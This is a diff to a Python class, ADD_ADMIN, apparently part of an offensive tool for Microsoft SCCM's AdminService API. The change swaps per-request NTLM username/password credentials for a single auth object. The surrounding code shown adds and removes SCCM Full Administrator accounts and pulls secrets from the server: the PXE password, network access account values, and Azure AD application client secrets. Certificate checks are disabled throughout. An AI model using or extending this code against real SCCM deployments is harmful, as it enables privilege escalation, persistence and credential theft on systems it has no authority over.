@@ -9,9 +9,8 @@ import base64
 
 
 class ADD_ADMIN:
-    def __init__(self, username, password, target_ip, logs_dir):
-        self.username = username
-        self.password = password
+    def __init__(self, auth, target_ip, logs_dir):
+        self.auth = auth
         self.target_ip = target_ip
         self.logs_dir = logs_dir
         self.headers = {'Content-Type': 'application/json; odata=verbose'}
@@ -49,7 +48,7 @@ class ADD_ADMIN:
 
         try:
             r = requests.post(f"{url}",
-                                auth=HttpNtlmAuth(self.username, self.password),
+                                auth=self.auth,
                                 verify=False,headers=self.headers, json=body)
             if r.status_code == 201:
                 logger.info(f"[+] Successfully added {self.targetuser} as an admin.")
@@ -69,7 +68,7 @@ class ADD_ADMIN:
             if adminid:
                 url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin({adminid})"
                 r = requests.delete(f"{url}",
-                        auth=HttpNtlmAuth(self.username, self.password),
+                        auth=self.auth,
                         verify=False,headers=self.headers)
                 if r.status_code == 204:
                     logger.info(f"[+] Successfully removed {self.targetuser} as an admin.")
@@ -86,7 +85,7 @@ class ADD_ADMIN:
         url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin/?$filter=LogonName eq '{self.targetuser}'"
         try:
             r = requests.get(f"{url}",
-                                auth=HttpNtlmAuth(self.username, self.password),
+                                auth=self.auth,
                                 verify=False,headers=self.headers)
             if r.status_code == 200:
                 try:
@@ -112,7 +111,7 @@ class ADD_ADMIN:
         url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin?$filter=RoleNames/any(role: role eq 'Full Administrator')&$select=LogonName"
         try:
             r = requests.get(f"{url}",
-                                auth=HttpNtlmAuth(self.username, self.password),
+                                auth=self.auth,
                                 verify=False,headers=self.headers)
             if r.status_code == 200:
                 data = r.json()
@@ -134,7 +133,7 @@ class ADD_ADMIN:
         url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin?$select=LogonName,RoleNames"
         try:
             r = requests.get(f"{url}",
-                                auth=HttpNtlmAuth(self.username, self.password),
+                                auth=self.auth,
                                 verify=False,headers=self.headers)
             if r.status_code == 200:
                 data = r.json()
@@ -160,7 +159,7 @@ class ADD_ADMIN:
         url = f"https://{self.target_ip}/AdminService/wmi/SMS_ConsoleAdminsData?$select=UserName,MachineName,Source,ConsoleVersion"
         try:
             r = requests.get(f"{url}",
-                                auth=HttpNtlmAuth(self.username, self.password),
+                                auth=self.auth,
                                 verify=False,headers=self.headers)
             if r.status_code == 200:
                 data = r.json()
@@ -186,7 +185,7 @@ class ADD_ADMIN:
         url = f"https://{self.target_ip}/AdminService/wmi/SMS_SCI_Reserved?$select=UserName,Reserved2,AccountUsage"
         try:
             r = requests.get(f"{url}",
-                                auth=HttpNtlmAuth(self.username, self.password),
+                                auth=self.auth,
                                 verify=False,headers=self.headers)
             if r.status_code == 200:
                 data = r.json()
@@ -204,7 +203,7 @@ class ADD_ADMIN:
         url = f"https://{self.target_ip}/AdminService/wmi/SMS_SCI_SCProperty?$filter=PropertyName eq 'PXEPassword'&$select=PropertyName,Value1"
         try:
             r = requests.get(f"{url}",
-                                auth=HttpNtlmAuth(self.username, self.password),
+                                auth=self.auth,
                                 verify=False,headers=self.headers)
             if r.status_code == 200:
                 data = r.json()
@@ -221,7 +220,7 @@ class ADD_ADMIN:
         url = f"https://{self.target_ip}/AdminService/wmi/SMS_SCI_SCProperty?$filter=startswith(PropertyName, 'GlobalAccount')&$select=Value1,Value2"
         try:
             r = requests.get(f"{url}",
-                                auth=HttpNtlmAuth(self.username, self.password),
+                                auth=self.auth,
                                 verify=False,headers=self.headers)
             if r.status_code == 200:
                 data = r.json()
@@ -239,7 +238,7 @@ class ADD_ADMIN:
         url = f"https://{self.target_ip}/AdminService/wmi/SMS_AAD_Application_Ex?$select=ClientID,SecretKey"
         try:
             r = requests.get(f"{url}",
-                                auth=HttpNtlmAuth(self.username, self.password),
+                                auth=self.auth,
                                 verify=False,headers=self.headers)
             if r.status_code == 200:
                 data = r.json()
@@ -256,7 +255,7 @@ class ADD_ADMIN:
         url = f"https://{self.target_ip}/AdminService/wmi/SMS_AAD_Tenant_Ex?$select=Name,TenantID"
         try:
             r = requests.get(f"{url}",
-                                auth=HttpNtlmAuth(self.username, self.password),
+                                auth=self.auth,
                                 verify=False,headers=self.headers)
             if r.status_code == 200:
                 data = r.json()
@@ -273,7 +272,7 @@ class ADD_ADMIN:
         url = f"https://{self.target_ip}/AdminService/wmi/SMS_Identification.GetProviderVersion"
         try:
             r = requests.get(f"{url}",
-                                auth=HttpNtlmAuth(self.username, self.password),
+                                auth=self.auth,
                                 verify=False,headers=self.headers)
             if r.status_code == 201:
                 data = r.json()
@@ -301,7 +300,7 @@ class ADD_ADMIN:
             
             try:
                 r = requests.post(url,
-                                auth=HttpNtlmAuth(self.username, self.password),
+                                auth=self.auth,
                                 verify=False,headers=self.headers,
                                 json=body)
                 r.raise_for_status()
